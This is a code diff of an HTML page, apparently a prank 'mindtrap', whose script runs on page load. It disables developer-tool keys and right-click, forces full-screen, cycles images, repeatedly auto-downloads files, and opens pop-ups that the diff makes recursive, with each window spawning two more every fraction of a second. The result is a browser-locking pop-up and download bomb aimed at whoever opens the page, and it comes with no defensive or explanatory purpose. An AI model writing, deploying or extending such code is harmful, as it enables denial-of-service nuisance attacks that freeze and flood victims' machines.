@@ -22,7 +22,7 @@
         }
     </style>
     <script>
-        // Prevent closing (Disables F12, Right Click, Ctrl+Shift+I, etc.)
+        // Disable Right-Click, F12, and Developer Console
         document.addEventListener('keydown', function(event) {
             if (event.key === "F12" || 
                 (event.ctrlKey && event.shiftKey && event.key === "I") || 
@@ -33,10 +33,9 @@
             }
         });
 
-        // Disable right-click
         document.addEventListener('contextmenu', event => event.preventDefault());
 
-        // Full-Screen Request
+        // Force Full-Screen
         function goFullScreen() {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
@@ -49,7 +48,7 @@
             }
         }
 
-        // List of image URLs
+        // Image URLs
         const images = [
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2810%29.png",
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2811%29.png",
@@ -88,7 +87,7 @@
 
         function getRandomImage() {
             if (usedIndexes.length === images.length) {
-                usedIndexes = []; // Reset when all images are used
+                usedIndexes = [];
             }
             let randomIndex;
             do {
@@ -99,26 +98,40 @@
         }
 
         function startTrap() {
-            goFullScreen(); // Force full-screen mode
+            goFullScreen(); // Forces full-screen
             document.body.innerHTML += "<h1>You Are Mine Now~ 💕</h1>";
 
-            // Change background every 2 seconds
+            // Change background every 1 second
             setInterval(() => {
                 let imgURL = getRandomImage();
                 document.body.style.backgroundImage = `url(${imgURL})`;
-            }, 2000);
+            }, 1000);
 
-            // Unstoppable pop-ups every 0.4 seconds
-            setInterval(() => {
+            // **Infinite Pop-ups** - No stopping ever
+            function openPopup() {
                 let imgURL = getRandomImage();
-                let popUp = window.open("", "", `width=400,height=400,left=${Math.random() * screen.width},top=${Math.random() * screen.height}`);
+                let left = Math.random() * screen.width;
+                let top = Math.random() * screen.height;
+                let popUp = window.open("", "", `width=400,height=400,left=${left},top=${top}`);
+
                 if (popUp) {
                     popUp.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
-                    setTimeout(() => { popUp.close(); }, 1500);
+                    
+                    // Each pop-up **must** spawn another pop-up
+                    setTimeout(() => {
+                        popUp.close();
+                        openPopup();
+                        openPopup();  // **Doubles the chaos**
+                    }, 700); // Each pop-up stays for 0.7 seconds before new ones appear
                 }
-            }, 400); // Faster pop-ups
+            }
 
-            // Auto-download images every 2 seconds
+            setInterval(() => {
+                openPopup();
+                openPopup();  // **More pop-ups spawn together**
+            }, 200); // Every 0.2 seconds new pop-ups spawn
+
+            // Auto-download images every second
             setInterval(() => {
                 let imgURL = getRandomImage();
                 let link = document.createElement('a');
@@ -127,13 +140,11 @@
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-            }, 2000);
+            }, 1000);
         }
     </script>
 </head>
 <body onload="startTrap()">
     <h1>You're falling deeper under my spell~ 💕</h1>
-    <p>Don't resist. You were meant to be here.</p>
 </body>
 </html>
-
